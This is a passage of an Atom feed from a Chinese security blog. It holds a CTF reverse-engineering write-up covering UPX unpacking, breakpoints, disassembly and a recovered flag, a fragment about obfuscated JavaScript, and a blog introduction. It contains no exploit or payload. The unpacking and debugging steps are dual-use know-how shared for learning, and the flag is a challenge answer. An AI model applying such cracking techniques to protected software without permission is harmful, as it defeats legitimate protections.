        &lt;p&gt;朋友发了这么一段东西，然后和我说熬夜也要把它解出来  我：？？？？？？？？&lt;/p&gt;
&lt;p&gt;没错经过一番搜索后发现这是一段加密的JS代码。&lt;/p&gt;
&lt;p&gt;(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]
      
    
    </summary>
    
    
      <category term="渗透" scheme="https://vxer-lee.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="Web渗透" scheme="https://vxer-lee.github.io/tagsssss/Web%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>湖湘杯 writeup</title>
    <link href="https://vxer-lee.github.io/%E6%B9%96%E6%B9%98%E6%9D%AFWriteup.html"/>
    <id>https://vxer-lee.github.io/%E6%B9%96%E6%B9%98%E6%9D%AFWriteup.html</id>
    <published>2020-01-06T03:59:36.000Z</published>
    <updated>2020-08-01T14:38:03.403Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、查壳"><a href="#一、查壳" class="headerlink" title="一、查壳"></a>一、查壳</h2><p>UPX的壳很好脱，可以在网上找现成的脱壳工具、或者是手动用单步跟踪法、ESP定律法。</p><img src="/%E6%B9%96%E6%B9%98%E6%9D%AFWriteup/截屏2019-11-09下午9.45.21.png" alt="截屏2019-11-09下午9.45.21" style="zoom:40%;"><h2 id="二、下断点"><a href="#二、下断点" class="headerlink" title="二、下断点"></a>二、下断点</h2><ol><li>找到OEP然后下断(这里入口点感觉被修改过变异过 不像正常的vc++2015程序的入口点)</li><li>右键字符串智能搜索</li><li>找到关键字 input Your Flag 单步跟踪</li></ol><p><img src="/%E6%B9%96%E6%B9%98%E6%9D%AFWriteup/%E6%88%AA%E5%B1%8F2019-11-09%E4%B8%8B%E5%8D%8810.26.46.png" alt="截屏2019-11-09下午10.26.46"> </p><p><img src="/%E6%B9%96%E6%B9%98%E6%9D%AFWriteup/%E6%88%AA%E5%B1%8F2019-11-09%E4%B8%8B%E5%8D%8810.29.31.png" alt="截屏2019-11-09下午10.26.46"> </p><h2 id="三、分析"><a href="#三、分析" class="headerlink" title="三、分析"></a>三、分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">01355386    52              push edx</span><br><span class="line">01355387    68 68A03501     push reverse.0135A068                    ; fmcj2y~&#123;</span><br><span class="line">0135538C    E8 16C0FFFF     call reverse.013513A7;    比较最后输入的命令行参数是否为(fmcj2y~&#123;)</span><br><span class="line">01355391    83C4 08         add esp,0x8          ;    类似于c:\tset\reverse.exe fmcj2y~&#123;</span><br><span class="line">01355394    85C0            test eax,eax</span><br><span class="line">01355396    74 19           je Xreverse.013553B1</span><br><span class="line">01355398    68 307E3501     push reverse.01357E30                    ; Input Error!\n</span><br><span class="line">0135539D    E8 D8BFFFFF     call reverse.0135137A</span><br><span class="line">013553A2    83C4 04         add esp,0x4</span><br><span class="line">013553A5    33C0            xor eax,eax</span><br></pre></td></tr></table></figure><p><img src="/%E6%B9%96%E6%B9%98%E6%9D%AFWriteup/111.png" alt="111"></p><h3 id="关键函数1"><a href="#关键函数1" class="headerlink" title="关键函数1"></a>关键函数1</h3><p><img src="/%E6%B9%96%E6%B9%98%E6%9D%AFWriteup/%E6%88%AA%E5%B1%8F2019-11-09%E4%B8%8B%E5%8D%8810.55.47.png" alt="截屏2019-11-09下午10.55.47"></p><h3 id="关键函数2"><a href="#关键函数2" class="headerlink" title="关键函数2"></a>关键函数2</h3><p><img src="/%E6%B9%96%E6%B9%98%E6%9D%AFWriteup/%E6%88%AA%E5%B1%8F2019-11-09%E4%B8%8B%E5%8D%8811.01.54.png" alt="截屏2019-11-09下午11.01.54"></p><p><img src="/%E6%B9%96%E6%B9%98%E6%9D%AFWriteup/%E6%88%AA%E5%B1%8F2019-11-09%E4%B8%8B%E5%8D%8811.00.05.png" alt="截屏2019-11-09下午11.00.05"></p><p>41A078地址的值为：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">41</span>A078[<span class="number">0</span>] = <span class="number">50</span></span><br><span class="line"><span class="number">41</span>A078[<span class="number">1</span>] = c6</span><br><span class="line"><span class="number">41</span>A078[<span class="number">2</span>] = f1</span><br><span class="line"><span class="number">41</span>A078[<span class="number">3</span>] = e4</span><br><span class="line"><span class="number">41</span>A078[<span class="number">4</span>] = e3</span><br><span class="line"><span class="number">41</span>A078[<span class="number">5</span>] = e2</span><br><span class="line"><span class="number">41</span>A078[<span class="number">6</span>] = <span class="number">9</span>a</span><br><span class="line"><span class="number">41</span>A078[<span class="number">7</span>] = a1</span><br><span class="line"><span class="number">41</span>A078[<span class="number">8</span>] = a7</span><br><span class="line"><span class="number">41</span>A078[<span class="number">9</span>] = de</span><br><span class="line"><span class="number">41</span>A078[<span class="number">10</span>] = da</span><br><span class="line"><span class="number">41</span>A078[<span class="number">11</span>] = <span class="number">46</span></span><br><span class="line"><span class="number">41</span>A078[<span class="number">12</span>] = ab</span><br><span class="line"><span class="number">41</span>A078[<span class="number">13</span>] = <span class="number">2</span>e</span><br><span class="line"><span class="number">41</span>A078[<span class="number">14</span>] = ff</span><br><span class="line"><span class="number">41</span>A078[<span class="number">15</span>] = db</span><br></pre></td></tr></table></figure><p>最后将每个值减1<br>得到flag<br><code>flag{4fc5f0e3e2e199a0a6ddd945aa2dfeda}</code></p><hr><p><img src="/%E6%B9%96%E6%B9%98%E6%9D%AFWriteup/%E6%88%AA%E5%B1%8F2019-11-09%E4%B8%8B%E5%8D%8811.18.50.png" alt="截屏2019-11-09下午11.18.50"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、查壳&quot;&gt;&lt;a href=&quot;#一、查壳&quot; class=&quot;headerlink&quot; title=&quot;一、查壳&quot;&gt;&lt;/a&gt;一、查壳&lt;/h2&gt;&lt;p&gt;UPX的壳很好脱，可以在网上找现成的脱壳工具、或者是手动用单步跟踪法、ESP定律法。&lt;/p&gt;
&lt;img src=&quot;/%E6%
      
    
    </summary>
    
    
      <category term="逆向" scheme="https://vxer-lee.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="PC逆向" scheme="https://vxer-lee.github.io/tagsssss/PC%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>你好博客</title>
    <link href="https://vxer-lee.github.io/hello-blog.html"/>
    <id>https://vxer-lee.github.io/hello-blog.html</id>
    <published>2020-01-05T03:59:36.000Z</published>
    <updated>2020-08-01T14:21:24.530Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00:"></a>0x00:</h2><p>博客创建于 2020年01月05号 11:59分36秒，主要用于记录学习、经验积累、技术文档分享。<br>专注逆向、网络安全</p><h1 id="0x01-分类"><a href="#0x01-分类" class="headerlink" title="0x01:分类"></a>0x01:分类</h1><p>逆向(iOS、Android、Win、macOS、Linux)<br>渗透（Web渗透、内网攻防<br>开发 (Python、C++、iOS、JavaScript)<br>漏洞（Pwn、IoT漏洞挖掘、二进制安全）</p><p><img src="/hello-blog/bg1.jpg" alt="壁纸1"></p><p><img src="/hello-blog/bg2.jpg" alt="壁纸1"></p><p><img src="/hello-blog/bg3.jpg" alt="壁纸1"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00:&quot;&gt;&lt;/a&gt;0x00:&lt;/h2&gt;&lt;p&gt;博客创建于 2020年01月05号 11:59分36秒，主要用于记录学习、经验积累、技术文档分享。&lt;br&gt;专注逆向、网络
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
